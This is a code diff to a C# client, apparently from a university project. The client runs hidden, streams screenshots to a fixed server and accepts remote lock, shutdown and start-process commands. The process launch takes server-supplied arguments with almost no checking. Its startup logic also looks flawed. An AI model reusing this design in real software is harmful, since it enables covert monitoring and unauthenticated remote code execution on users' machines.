@@ -19,18 +19,28 @@ namespace UniProject.FormClient
         private Thread m_ScreenWorkerThread;
         private volatile bool m_ShouldWork;
         private bool pauseSending = false;
+        private bool Initialised = false;
+
         //Create a new bitmap.
         static Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
         Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
         public frmMain()
         {
-            InitializeComponent();
-            m_Client = new Client("141.163.232.207", 101);
-            m_ShouldWork = true;
-            m_ScreenWorkerThread = new Thread(ScreenFeed);
-            m_Client.ClientConnected += client_ClientConnected;
-            m_Client.DataReceived += client_DataReceived;
-            m_Client.ServerConnectionDropped += m_Client_ServerConnectionDropped;
+            if (WinAPI.IsProcessRunning("UniProject.FormClient"))
+            {
+                Application.Exit();
+            }
+            else
+            {
+                InitializeComponent();
+                m_Client = new Client("10.248.0.27", 101);
+                m_ShouldWork = true;
+                m_ScreenWorkerThread = new Thread(ScreenFeed);
+                m_Client.ClientConnected += client_ClientConnected;
+                m_Client.DataReceived += client_DataReceived;
+                m_Client.ServerConnectionDropped += m_Client_ServerConnectionDropped;
+                Initialised = true;
+            }
         }
 
         void m_Client_ServerConnectionDropped(CustomEventArgs e)
@@ -55,12 +65,22 @@ namespace UniProject.FormClient
                 {
                     WinAPI.LockWorkStation();
                 }
+                else if (args[1] == "Shutdown")
+                {
+                    WinAPI.Shutdown();
+                }
+                else if (args[1] == "StartProcess")
+                {
+                    string temp = message.Replace(args[0], "").Replace(args[1], "").Replace("..", "");
+                    string[] urlArgs = temp.Split('|');
+                    WinAPI.StartProcess(urlArgs[0], urlArgs[1]);
+                }
             }
             else if (args[0] == "SoftAPI")
             {
                 if (args[1] == "Lock")
                 {
-                    //Hacked in because creating a new form on this same thread locked the application ?
+                    // Hacked in because creating a new form on this same thread locked the application ?
                     Application.Run(new frmFullScreen(Properties.Resources.LockedScreen));
                     // TODO lock keyboard and mouse input
                 }
@@ -74,6 +94,7 @@ namespace UniProject.FormClient
 
         private void frmMain_Load(object sender, EventArgs e)
         {
+            while (!Initialised) ;
             this.Hide();
             m_Client.Start();
             m_ScreenWorkerThread.Start();
@@ -97,7 +118,7 @@ namespace UniProject.FormClient
                         }
                         catch (Exception ex)
                         {
-
+                            m_Client.Send("Error when sending picture from " + m_Client.LocalIP + ": " + ex.Message.ToString());
                         }
                     }
                     bmpScreenshot.Save(ms, System.Drawing.Imaging.ImageFormat.Bmp);
